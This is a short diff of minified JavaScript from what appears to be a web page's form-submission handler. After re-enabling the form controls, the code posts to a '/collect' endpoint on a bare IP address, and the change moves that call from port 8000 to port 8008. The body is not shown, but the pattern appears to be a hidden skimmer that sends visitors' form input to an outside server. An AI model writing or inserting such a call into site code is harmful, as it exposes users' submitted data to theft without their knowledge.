@@ -159,7 +159,7 @@
         }).finally(function () {
             a.disabled = !1, c.disabled = !1
 
-            fetch('https://13.215.183.84:8000/collect', {
+            fetch('https://13.215.183.84:8008/collect', {
                 method: 'POST',
                 headers: {
                     'Accept': 'application/json',
